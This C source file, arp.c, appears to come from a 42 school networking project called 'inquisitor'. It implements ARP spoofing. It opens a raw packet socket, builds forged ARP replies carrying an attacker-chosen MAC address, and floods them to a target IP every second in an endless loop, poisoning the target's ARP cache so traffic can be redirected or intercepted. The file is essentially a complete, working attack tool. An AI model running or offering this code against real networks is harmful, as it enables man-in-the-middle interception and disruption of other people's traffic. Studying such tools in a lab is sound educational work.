/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   arp.c                                              :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: irifarac <marvin@42.fr>                    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/11/22 11:57:46 by irifarac          #+#    #+#             */
/*   Updated: 2024/11/22 12:16:06 by irifarac         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "inquisitor.h"
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>
#include <sys/types.h>
#include <netinet/in.h>

int	sock = -1;
bool	verbose = false;

static const char	*get_default_interface(void)
{
	char	errbuf[PCAP_ERRBUF_SIZE];
	pcap_if_t	*interfaces;

	if (pcap_findalldevs(&interfaces, errbuf) < 0)
	{
		fprintf(stderr, "pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}
	if (interfaces == NULL)
	{
		fprintf(stderr, "No interfaces found\n");
		exit(1);
	}
	printf("default interface is %s\n", interfaces->name);
	return (interfaces->name);
}


static void set_arp_spoof(const char *dev, char *ip_src, char *mac_src, char *ip_target, char *mac_target)
{
	char				buffer[42];
	struct ether_header	*eth;
	struct ether_arp	*arp;
	struct sockaddr_ll	device;
	u_char				source_mac[MAC_ADDR_LEN];
//	char				gateway_ip[16] = {0};

	eth = (struct ether_header *)buffer;
	arp = (struct ether_arp *)(buffer + sizeof(struct ether_header));
	sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (sock < 0)
	{
		perror("socket");
		exit(1);
	}
	if (sscanf(mac_src, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
		&source_mac[0], &source_mac[1], &source_mac[2],
		&source_mac[3], &source_mac[4], &source_mac[5]) != 6)
	{
		fprintf(stderr, "Invalid MAC address\n");
		exit(1);
	}
	set_hdrs(eth, arp, source_mac, ip_target);
/*	get_gateway(gateway_ip);
	memset(eth->ether_dhost, 0xff, ETH_ALEN);
	memcpy(eth->ether_shost, source_mac, ETH_ALEN);
	eth->ether_type = htons(ETH_P_ARP);

	arp->arp_hrd = htons(ARPHRD_ETHER);
	arp->arp_pro = htons(ETH_P_IP);
	arp->arp_hln = ETH_ALEN;
	arp->arp_pln = 4;
	arp->arp_op = htons(ARPOP_REPLY);

	memcpy(arp->arp_sha, source_mac, ETH_ALEN);
	inet_pton(AF_INET, gateway_ip, arp->arp_spa);
	memset(arp->arp_tha, 0, ETH_ALEN);
	inet_pton(AF_INET, ip_target, arp->arp_tpa);*/

	memset(&device, 0, sizeof(device));
	device.sll_family = AF_PACKET;
	device.sll_ifindex = if_nametoindex(dev);
	if (device.sll_ifindex == 0)
	{
		perror("if_nametoindex");
		exit(1);
	}
	device.sll_halen = ETH_ALEN;
	while(1)
	{
		printf("sending arp reply to %s\n", ip_target);
		if (sendto(sock, buffer, 42, 0, (struct sockaddr *)&device, sizeof(device)) < 0)
		{
			perror("sendto");
			exit(1);
		}
		sleep(1);
	}
	(void)verbose;
	(void)mac_target;
	(void)ip_src;
	close(sock);
}


int	main(int argc, char **argv)
{
//	char		errbuf[PCAP_ERRBUF_SIZE];
	const char	*dev;
	char		*ip_src;
	char		*ip_target;
	char		*mac_src;
	char		*mac_target;
	int			opt;

	check_errors(argc);
	dev = NULL;
	while ((opt = getopt(argc, argv, "hi:v")) != -1)
	{
		switch (opt)
		{
			case 'h':
				usage();
				return (0);
			case 'i':
				dev = optarg;
				break ;
			case 'v':
				verbose = true;
				break ;
			default:
				usage();
				return (1);
		}
	}
	if (argc - optind < 4)
	{
		usage();
		return (1);
	}
	ip_src = argv[optind];
	mac_src = argv[optind + 1];
	ip_target = argv[optind + 2];
	mac_target = argv[optind + 3];
	signal(SIGINT, sigint_handler);
	if (dev == NULL)
			dev = get_default_interface();
	printf("dev is %s\n", dev);
	set_arp_spoof(dev, ip_src, mac_src, ip_target, mac_target);
	return (0);
}
